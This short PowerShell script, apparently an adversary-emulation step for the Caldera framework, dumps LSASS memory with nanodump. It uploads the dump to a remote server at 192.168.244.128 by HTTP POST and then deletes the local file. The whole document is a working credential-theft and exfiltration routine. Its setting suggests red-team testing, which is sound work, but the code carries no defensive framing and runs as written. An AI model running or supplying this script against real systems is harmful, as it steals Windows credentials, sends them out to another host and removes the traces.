# Dump LSASS with nanodump
$dumpPath = "$env:TEMP\lsass.dmp"
Start-Process -FilePath "$env:ProgramData\Microsoft\Windows\Caldera\nanodump\dist\nanodump.x64.exe" `
    -ArgumentList "--write $dumpPath --valid" -Wait

# Exfiltrate via HTTP POST to Caldera
if (Test-Path $dumpPath) {
    $server = "http://192.168.244.128:8888/file/upload"
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }

    $body = "--$boundary$LF"
    $body += "Content-Disposition: form-data; name=`"data`"; filename=`"lsass.dmp`"$LF"
    $body += "Content-Type: application/octet-stream$LF$LF"
    $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($body)

    $fileBytes = [System.IO.File]::ReadAllBytes($dumpPath)
    $endBoundary = "$LF--$boundary--$LF"
    $endBoundaryBytes = [System.Text.Encoding]::ASCII.GetBytes($endBoundary)

    $fullBody = New-Object System.IO.MemoryStream
    $fullBody.Write($bodyBytes, 0, $bodyBytes.Length)
    $fullBody.Write($fileBytes, 0, $fileBytes.Length)
    $fullBody.Write($endBoundaryBytes, 0, $endBoundaryBytes.Length)
    $fullBody.Seek(0, "Begin") | Out-Null

    Invoke-WebRequest -Uri $server -Method Post -Body $fullBody -Headers $headers
}

# Cleanup
Start-Sleep -Seconds 5
Remove-Item $dumpPath -Force
